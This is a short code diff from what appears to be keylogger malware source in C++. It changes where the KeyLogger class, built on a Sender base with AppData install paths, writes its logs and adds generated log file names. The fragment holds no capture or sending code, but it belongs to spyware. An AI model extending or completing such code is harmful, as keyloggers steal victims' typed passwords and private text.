@@ -211,5 +211,6 @@ void KeyLogger::stopKeylogger(){
 }
 
 KeyLogger::KeyLogger(const Stream &stream) : Sender(stream) {
-    pathOfLogs = Install::getAppDataPath() + L"\\" + Converter::string2wstring(SUBDIRECTORY_FILE_NAME) + L"\\";
+    pathOfLogs = Install::getAppDataPath() + L"\\" + Converter::string2wstring(KEYLOGGER) + L"\\";
+    logsFileName = generateLogName();
 }
